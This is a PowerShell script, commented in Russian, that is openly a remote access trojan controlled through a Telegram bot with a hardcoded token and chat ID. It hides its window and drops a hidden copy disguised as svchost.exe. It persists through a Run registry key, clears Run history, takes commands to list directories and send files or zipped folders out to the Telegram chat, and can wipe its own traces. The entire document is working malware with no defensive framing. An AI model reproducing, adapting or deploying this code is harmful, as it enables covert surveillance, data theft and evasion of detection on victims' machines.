# RAT через Telegram Bot - ИСПРАВЛЕННАЯ ВЕРСИЯ
$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$ChatID = "5674514050"

# Установка кодировки UTF-8 для корректного отображения русских символов
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$PSDefaultParameterValues['*:Encoding'] = 'utf8'

# Настройки скрытности
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.IO.Compression.FileSystem

# Скрытие окна PowerShell
try {
    Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
    '
    $consolePtr = [Console.Window]::GetConsoleWindow()
    [Console.Window]::ShowWindow($consolePtr, 0)
} catch { }

# Очистка истории RUN при запуске
try {
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
} catch { }

# Функция отправки сообщений с правильной кодировкой
function Send-Telegram {
    param([string]$Message, [string]$FilePath = $null)
    
    $lastMessage = $global:LastSentMessage
    if ($Message -eq $lastMessage) { return }
    $global:LastSentMessage = $Message
    
    $url = "https://api.telegram.org/bot$Token/sendMessage"
    $body = @{
        chat_id = $ChatID
        text = $Message
    }
    
    try {
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $body -UseBasicParsing
    } catch { 
        # Молча игнорируем ошибки отправки
    }
    
    if ($FilePath -and (Test-Path $FilePath)) {
        Send-TelegramFile -FilePath $FilePath
    }
}

# Функция отправки файлов
function Send-TelegramFile {
    param([string]$FilePath)
    
    $url = "https://api.telegram.org/bot$Token/sendDocument"
    
    try {
        $fileInfo = Get-Item $FilePath
        $form = @{
            chat_id = $ChatID
            document = $fileInfo
        }
        Invoke-RestMethod -Uri $url -Method Post -Form $form -UseBasicParsing
    } catch {
        # Молча игнорируем ошибки отправки файлов
    }
}

# Функция создания ZIP архива
function Compress-Folder {
    param([string]$FolderPath, [string]$ZipPath)
    
    try {
        [System.IO.Compression.ZipFile]::CreateFromDirectory($FolderPath, $ZipPath, [System.IO.Compression.CompressionLevel]::Fastest, $false)
        return $true
    } catch {
        return $false
    }
}

# Функция очистки RAT
function Invoke-Cleanup {
    # Отправляем начало очистки
    Send-Telegram "🔍 Начинается полная очистка RAT..."

    # 1. Завершаем все процессы RAT
    Send-Telegram "🔄 Этап 1: Завершение процессов RAT"

    $processes = Get-Process | Where-Object {
        $_.ProcessName -eq "powershell" -or 
        $_.ProcessName -eq "pwsh" -or
        $_.ProcessName -eq "cmd"
    }

    foreach ($process in $processes) {
        try {
            $cmdLine = (Get-WmiObject Win32_Process -Filter "ProcessId = $($process.Id)").CommandLine
            if ($cmdLine -like "*WindowsSystem*" -or $cmdLine -like "*svchost.exe*" -or $cmdLine -like "*Windows Defender Security*" -or $cmdLine -like "*spoolsv.exe*" -or $cmdLine -like "*WindowsLogs*" -or $cmdLine -like "*8429674512*") {
                Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
            }
        } catch { }
    }

    # 2. Удаляем файлы RAT
    Send-Telegram "🔄 Этап 2: Удаление файлов RAT"

    $filesToDelete = @(
        "$env:WINDIR\System32\Microsoft.NET\Framework64\v4.0.30319\Config\svchost.exe",
        "$env:TEMP\WindowsSystem.exe",
        "$env:TEMP\cleanup_*.ps1",
        "$env:WINDIR\System32\drivers\etc\hosts_backup\spoolsv.exe",
        "$env:TEMP\rat_installed.marker",
        "$env:APPDATA\Microsoft\WindowsLogs\svchost.exe",
        "$env:TEMP\windows_update.marker"
    )

    $deletedFiles = @()
    foreach ($filePattern in $filesToDelete) {
        try {
            Get-ChildItem -Path $filePattern -ErrorAction SilentlyContinue | ForEach-Object {
                Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
                $deletedFiles += $_.FullName
            }
        } catch { }
    }

    # 3. Очищаем автозагрузку реестра
    Send-Telegram "🔄 Этап 3: Очистка реестра"

    $regPaths = @(
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce", 
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
    )

    $regEntries = @()
    foreach ($regPath in $regPaths) {
        try {
            $value1 = Get-ItemProperty -Path $regPath -Name "Windows Defender Security" -ErrorAction SilentlyContinue
            if ($value1) {
                Remove-ItemProperty -Path $regPath -Name "Windows Defender Security" -Force -ErrorAction SilentlyContinue
                $regEntries += "$regPath\Windows Defender Security"
            }
            
            $value2 = Get-ItemProperty -Path $regPath -Name "Windows Audio Service" -ErrorAction SilentlyContinue
            if ($value2) {
                Remove-ItemProperty -Path $regPath -Name "Windows Audio Service" -Force -ErrorAction SilentlyContinue
                $regEntries += "$regPath\Windows Audio Service"
            }
            
            $value3 = Get-ItemProperty -Path $regPath -Name "Windows Logs Service" -ErrorAction SilentlyContinue
            if ($value3) {
                Remove-ItemProperty -Path $regPath -Name "Windows Logs Service" -Force -ErrorAction SilentlyContinue
                $regEntries += "$regPath\Windows Logs Service"
            }
        } catch { }
    }

    # 4. Очищаем историю RUN
    Send-Telegram "🔄 Этап 4: Очистка истории RUN"
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue

    # 5. Финальный отчет
    $report = @"
✅ ОЧИСТКА RAT ЗАВЕРШЕНА

Удаленные файлы:
$($deletedFiles -join "`n")

Удаленные записи реестра:
$($regEntries -join "`n")

Все следы RAT успешно удалены.
"@

    Send-Telegram $report
    return $true
}

# Установка в автозагрузку
$installMarker = "$env:TEMP\windows_update.marker"

# Проверяем, не установлен ли уже RAT
if (!(Test-Path $installMarker)) {
    # Создаем маркер установки
    "Windows Update Helper - $(Get-Date)" | Out-File -FilePath $installMarker -Encoding UTF8
    
    # Скрытая папка в AppData
    $hiddenFolder = "$env:APPDATA\Microsoft\WindowsLogs"
    if (!(Test-Path $hiddenFolder)) { 
        New-Item -Path $hiddenFolder -ItemType Directory -Force | Out-Null
        attrib +h "$hiddenFolder" 2>&1 | Out-Null
    }
    
    $scriptPath = "$hiddenFolder\svchost.exe"
    
    # Сохраняем упрощенную версию скрипта для автозагрузки
    $simpleScript = @'
$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$ChatID = "5674514050"

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$PSDefaultParameterValues['*:Encoding'] = 'utf8'

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.IO.Compression.FileSystem

try {
    Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
    '
    $consolePtr = [Console.Window]::GetConsoleWindow()
    [Console.Window]::ShowWindow($consolePtr, 0)
} catch { }

function Send-Telegram($Message, $FilePath = $null) {
    $url = "https://api.telegram.org/bot$Token/sendMessage"
    $body = @{chat_id = $ChatID; text = $Message}
    try { Invoke-RestMethod -Uri $url -Method Post -Body $body -UseBasicParsing | Out-Null } catch { }
}

function Send-TelegramFile($FilePath) {
    $url = "https://api.telegram.org/bot$Token/sendDocument"
    try {
        $fileInfo = Get-Item $FilePath
        $form = @{chat_id = $ChatID; document = $fileInfo}
        Invoke-RestMethod -Uri $url -Method Post -Form $form -UseBasicParsing
    } catch { }
}

function Compress-Folder($FolderPath, $ZipPath) {
    try {
        [System.IO.Compression.ZipFile]::CreateFromDirectory($FolderPath, $ZipPath, [System.IO.Compression.CompressionLevel]::Fastest, $false)
        return $true
    } catch { return $false }
}

$currentDir = "C:\"
$LastSentMessage = ""
$LastUpdateId = 0

Send-Telegram "RAT активирован на $env:COMPUTERNAME`nДоступные команды:`n/help`n/ls`n/cd [папка]`n/download [файл]`n/destroy"

while ($true) {
    try {
        $offset = if ($LastUpdateId) { $LastUpdateId + 1 } else { 0 }
        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset&timeout=60" -UseBasicParsing
        if ($updates.ok -and $updates.result.Count -gt 0) {
            foreach ($update in $updates.result) {
                $LastUpdateId = $update.update_id
                if ($update.message.chat.id -eq $ChatID) {
                    $command = $update.message.text
                    switch -regex ($command) {
                        "^/help$" { Send-Telegram "Команды:`n/help`n/ls`n/cd [папка]`n/download [файл]`n/destroy" }
                        "^/ls$" { 
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "Содержимое $currentDir`n$($fileList -join "`n")"
                        }
                        "^/cd (.+)$" {
                            $newDir = $matches[1].Trim()
                            if ($newDir -eq "..") {
                                $currentDir = Split-Path $currentDir -Parent
                                if (!$currentDir) { $currentDir = "C:\" }
                            } else {
                                $testPath = Join-Path $currentDir $newDir
                                if (Test-Path $testPath -PathType Container) {
                                    $currentDir = $testPath
                                } else {
                                    Send-Telegram "Директория не найдена: $newDir"
                                    continue
                                }
                            }
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "/ls $currentDir`n$($fileList -join "`n")"
                        }
                        "^/download (.+)$" {
                            $target = $matches[1].Trim()
                            $fullPath = Join-Path $currentDir $target
                            if (Test-Path $fullPath) {
                                if (Test-Path $fullPath -PathType Container) {
                                    $zipPath = "$env:TEMP\$([System.IO.Path]::GetRandomFileName()).zip"
                                    if (Compress-Folder -FolderPath $fullPath -ZipPath $zipPath) {
                                        Send-Telegram "Папка $target заархивирована" $zipPath
                                        Remove-Item $zipPath -Force
                                    } else {
                                        Send-Telegram "Ошибка архивации: $target"
                                    }
                                } else {
                                    Send-Telegram "Файл $target отправлен" $fullPath
                                }
                            } else {
                                Send-Telegram "Файл/папка не найдены: $target"
                            }
                        }
                        "^/destroy$" {
                            Send-Telegram "🔄 Самоуничтожение..."
                            try {
                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Windows Logs Service" -Force -ErrorAction SilentlyContinue
                                Remove-Item "$env:APPDATA\Microsoft\WindowsLogs\svchost.exe" -Force -ErrorAction SilentlyContinue
                                Remove-Item "$env:TEMP\windows_update.marker" -Force -ErrorAction SilentlyContinue
                                Send-Telegram "✅ RAT уничтожен"
                                Stop-Process -Id $pid -Force
                            } catch { Stop-Process -Id $pid -Force }
                        }
                    }
                }
            }
        }
    } catch { }
    Start-Sleep -Seconds 2
}
'@

    $simpleScript | Out-File -FilePath $scriptPath -Encoding UTF8
    attrib +h "$scriptPath" 2>&1 | Out-Null
}

# Установка в автозагрузку
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }

$uniqueName = "Windows Logs Service"
Set-ItemProperty -Path $regPath -Name $uniqueName -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:APPDATA\Microsoft\WindowsLogs\svchost.exe`"" -Force -ErrorAction SilentlyContinue

# Основные переменные
$currentDir = "C:\"
$global:LastSentMessage = ""
$global:LastUpdateId = 0

# Отправка информации о запуске
Send-Telegram "RAT активирован на $env:COMPUTERNAME
Доступные команды:
/help - список команд
/ls - список файлов
/cd [папка] - сменить директорию
/download [файл] - скачать файл
/destroy - самоуничтожение"

# Основной цикл опроса
while ($true) {
    try {
        $offset = if ($global:LastUpdateId) { $global:LastUpdateId + 1 } else { 0 }
        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset&timeout=60" -Method Get -UseBasicParsing
        
        if ($updates.ok -and $updates.result.Count -gt 0) {
            foreach ($update in $updates.result) {
                $global:LastUpdateId = $update.update_id
                
                if ($update.message.chat.id -eq $ChatID) {
                    $command = $update.message.text
                    
                    # Обработка команд
                    switch -regex ($command) {
                        "^/help$" {
                            Send-Telegram "Доступные команды:
/help - показать это сообщение
/ls - список файлов в текущей директории
/cd [папка] - сменить директорию
/download [файл] - скачать файл или папку
/destroy - самоуничтожение RAT"
                        }
                        "^/ls$" {
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "Содержимое $currentDir
$($fileList -join "`n")"
                        }
                        "^/cd (.+)$" {
                            $newDir = $matches[1].Trim()
                            if ($newDir -eq "..") {
                                $currentDir = Split-Path $currentDir -Parent
                                if (!$currentDir) { $currentDir = "C:\" }
                            } else {
                                $testPath = Join-Path $currentDir $newDir
                                if (Test-Path $testPath -PathType Container) {
                                    $currentDir = $testPath
                                } else {
                                    Send-Telegram "Директория не найдена: $newDir"
                                    continue
                                }
                            }
                            
                            # Отправляем содержимое новой директории с помощью /ls
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "/ls $currentDir
$($fileList -join "`n")"
                        }
                        "^/download (.+)$" {
                            $target = $matches[1].Trim()
                            $fullPath = Join-Path $currentDir $target
                            
                            if (Test-Path $fullPath) {
                                if (Test-Path $fullPath -PathType Container) {
                                    # Архивируем папку
                                    $zipPath = "$env:TEMP\$([System.IO.Path]::GetRandomFileName()).zip"
                                    if (Compress-Folder -FolderPath $fullPath -ZipPath $zipPath) {
                                        Send-Telegram "Папка $target заархивирована" $zipPath
                                        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                                    } else {
                                        Send-Telegram "Ошибка архивации папки: $target"
                                    }
                                } else {
                                    Send-Telegram "Файл $target отправлен" $fullPath
                                }
                            } else {
                                Send-Telegram "Файл/папка не найдены: $target"
                            }
                        }
                        "^/destroy$" {
                            Send-Telegram "🔄 Запуск процедуры самоуничтожения..."
                            try {
                                $cleanupResult = Invoke-Cleanup
                                if ($cleanupResult) {
                                    Start-Sleep -Seconds 3
                                    Stop-Process -Id $pid -Force
                                }
                            } catch {
                                Send-Telegram "❌ Ошибка при самоуничтожении"
                                try {
                                    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
                                    Stop-Process -Id $pid -Force
                                } catch { }
                            }
                        }
                    }
                }
            }
        }
    } catch { 
        Start-Sleep -Seconds 5
    }
}
